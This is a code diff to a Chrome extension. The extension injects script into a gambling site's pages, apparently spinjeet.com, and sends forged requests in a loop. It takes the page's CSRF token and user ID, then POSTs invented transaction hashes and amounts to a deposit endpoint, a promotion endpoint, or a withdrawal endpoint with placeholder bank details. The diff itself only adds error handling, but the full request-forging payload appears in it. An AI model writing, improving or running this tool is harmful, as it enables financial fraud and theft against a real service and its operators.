@@ -201,61 +201,67 @@ document.addEventListener('DOMContentLoaded', async () => {
     for (let i = 1; i <= loopCount; i++) {
       log(`Firing packet ${i}/${loopCount}...`, 'info');
 
-      const results = await chrome.scripting.executeScript({
-        target: { tabId: tab.id },
-        args: [{ vector, amount, hash }],
-        func: async (params) => {
-          const token = document.querySelector('meta[name="csrf-token"]')?.content 
-                     || document.querySelector('input[name="_token"]')?.value 
-                     || '';
-          
-          let userId = 'UNKNOWN';
-          if (window.user && window.user.id) userId = window.user.id;
-          else if (window.userId) userId = window.userId;
+      let results;
+      try {
+        results = await chrome.scripting.executeScript({
+          target: { tabId: tab.id },
+          args: [{ vector, amount, hash }],
+          func: async (params) => {
+            const token = document.querySelector('meta[name="csrf-token"]')?.content 
+                       || document.querySelector('input[name="_token"]')?.value 
+                       || '';
+            
+            let userId = 'UNKNOWN';
+            if (window.user && window.user.id) userId = window.user.id;
+            else if (window.userId) userId = window.userId;
 
-          const prefix = window.location.hostname.includes('spinjeet.com') ? '/api2/v2' : '';
-          const orderId = `INV_R${Date.now()}${Math.floor(Math.random() * 999999)}`;
+            const prefix = window.location.hostname.includes('spinjeet.com') ? '/api2/v2' : '';
+            const orderId = `INV_R${Date.now()}${Math.floor(Math.random() * 999999)}`;
 
-          try {
-            let res;
-            if (params.vector === 'quantum') {
-              res = await fetch(`${prefix}/storeTransaction`, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                  'X-Requested-With': 'XMLHttpRequest',
-                  'X-CSRF-TOKEN': token
-                },
-                body: `_token=${token}&hashed=${params.hash}&amount=${params.amount}&userid=${userId}&orderId=${orderId}`
-              });
-            } else if (params.vector === 'promo') {
-              res = await fetch(`${prefix}/joinPromotion/22`, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                  'X-Requested-With': 'XMLHttpRequest',
-                  'X-CSRF-TOKEN': token
-                },
-                body: `_token=${token}&amount=${params.amount}`
-              });
-            } else {
-              res = await fetch(`${prefix}/api2/v2/withdraw`, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                  'X-Requested-With': 'XMLHttpRequest',
-                  'X-CSRF-TOKEN': token
-                },
-                body: `_token=${token}&amount=${params.amount}&account_name=Account&account_number=123456&ifsc=SBIN0001234&bank_name=SBI`
-              });
+            try {
+              let res;
+              if (params.vector === 'quantum') {
+                res = await fetch(`${prefix}/storeTransaction`, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-CSRF-TOKEN': token
+                  },
+                  body: `_token=${token}&hashed=${params.hash}&amount=${params.amount}&userid=${userId}&orderId=${orderId}`
+                });
+              } else if (params.vector === 'promo') {
+                res = await fetch(`${prefix}/joinPromotion/22`, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-CSRF-TOKEN': token
+                  },
+                  body: `_token=${token}&amount=${params.amount}`
+                });
+              } else {
+                res = await fetch(`${prefix}/api2/v2/withdraw`, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'X-CSRF-TOKEN': token
+                  },
+                  body: `_token=${token}&amount=${params.amount}&account_name=Account&account_number=123456&ifsc=SBIN0001234&bank_name=SBI`
+                });
+              }
+
+              return { status: res.status };
+            } catch (e) {
+              return { status: 'ERR' };
             }
-
-            return { status: res.status };
-          } catch (e) {
-            return { status: 'ERR' };
           }
-        }
-      });
+        });
+      } catch (err) {
+        log(`Error: Cannot execute on this page (${err.message})`, 'error');
+        break; // Exit the loop safely
+      }
 
       if (results && results[0] && results[0].result) {
         const out = results[0].result;
